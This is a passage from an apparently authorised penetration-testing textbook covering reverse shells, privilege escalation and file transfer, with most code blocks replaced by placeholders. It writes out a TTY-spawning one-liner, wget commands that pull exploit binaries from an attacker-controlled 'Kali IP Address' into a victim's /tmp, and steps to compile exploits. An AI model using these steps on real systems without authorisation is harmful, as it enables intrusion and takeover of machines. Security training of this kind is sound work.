  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE50]'
  prefs: []
  type: TYPE_PRE
- en: Speaking of Python, if you get a remote shell, you can spawn a TTY shell using
    `python -c 'import pty; pty.spawn("/bin/sh")'`.
  prefs: []
  type: TYPE_NORMAL
- en: '**PHP**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE51]'
  prefs: []
  type: TYPE_PRE
- en: '**Ruby**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE52]'
  prefs: []
  type: TYPE_PRE
- en: '**Netcat**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE53]'
  prefs: []
  type: TYPE_PRE
- en: '**Java**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE54]'
  prefs: []
  type: TYPE_PRE
- en: Privilege escalation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'After exploiting a vulnerability, most of the time, you will get a limited
    shell. The next step is to get an admin account on the victim machine. To accomplish
    this, you will need to choose one of the following methodologies:'
  prefs: []
  type: TYPE_NORMAL
- en: Transfer a file to the victim machine to allow you to have a root shell (for
    example, Dirty COW)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Copy–pasting a PowerShell payload for Windows OS (for example, Empire PowerShell)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using Metasploit/Meterpreter to escalate the privileges (refer to *Appendix
    B*)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Manually searching for misconfigured parameters in order to get an admin/root
    shell
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: File transfers
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s look at a practical scenario. Say you just got a limited shell into
    the victim''s machine. You know that the OS is Linux and you want to upload `Dirty
    COW` to the remote server  to execute it. Here are the steps for this method:'
  prefs: []
  type: TYPE_NORMAL
- en: Copy the `Dirty COW` binary into the target HTTP directory located at `/var/www/html`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Start the web server using `$service apache2 start`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Download the file to the victim''s machine through the limited shell using
    the following commands (I will download the file into the `/tmp` directory):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`cd /tmp`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`$wget [http://Kali IP Address/filename]`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: But what if I want to transfer a file to a Windows machine? For this, I need
    to use PowerShell, as shown in the following section.
  prefs: []
  type: TYPE_NORMAL
- en: Using PowerShell
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Execute the following commands in your limited shell to create the script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE55]'
  prefs: []
  type: TYPE_PRE
- en: I've chosen the filename `get-admin.exe`. You don't have to use the same name;
    you can use any name you like.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, execute the script using `powershell.exe`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE56]'
  prefs: []
  type: TYPE_PRE
- en: Using VBScript
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For older versions of Windows with no PowerShell, we will use VBScript. The
    first step is to create the script. Then, we can execute it using the `cscript`
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE57]'
  prefs: []
  type: TYPE_PRE
- en: 'Execute the `wget_win.vbs` script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE58]'
  prefs: []
  type: TYPE_PRE
- en: I've chosen the filename `get-admin.exe`. You don't have to use the same name;
    you can use any name you like.
  prefs: []
  type: TYPE_NORMAL
- en: Administrator or root
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Typing all these commands is time consuming. The best way to go through this
    process faster is to upload a scripted file to your victim''s machine using the
    methods described in the previous section, *File transfers*. The best script out
    there on the web can be downloaded from the following GitHub repositories:'
  prefs: []
  type: TYPE_NORMAL
- en: '**For Windows**: [https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**For Linux**: [https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'If you''re using Metasploit and you have a Meterpreter session, then use the
    following command to elevate your privileges:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE59]'
  prefs: []
  type: TYPE_PRE
- en: Refer to *Appendix B* for a complete guide to Metasploit/Meterpreter privilege
    escalation.
  prefs: []
  type: TYPE_NORMAL
- en: 'Windows privilege escalation exploits are often written in Python. You can
    download `pyinstaller.py` to convert the exploit into an executable and upload
    it to the remote server—for example:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Install PyInstaller**: `$pip install pyinstaller`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Download your exploit**: `$wget http://[exploit URL]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Convert it**: `$python pyinstaller.py --onefile [python file.py]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Some exploits are written in the C language. To compile C language binaries,
    execute the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '`$gcc -o [outfile name] [original binary.c]`'
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: So many topics were covered in this chapter, from information gathering to privilege
    escalation. I tried to cover the most important ones and then get straight to
    the point without the nitty-gritty details in order to maximize the topics I could
    cover in a single chapter.
  prefs: []
  type: TYPE_NORMAL
- en: What you learned in this chapter is just half the story regarding penetration
    testing. In fact, in this chapter, we just covered network-based assessment. In
    the next chapter, we will cover web-application-based penetration testing.
  prefs: []
  type: TYPE_NORMAL
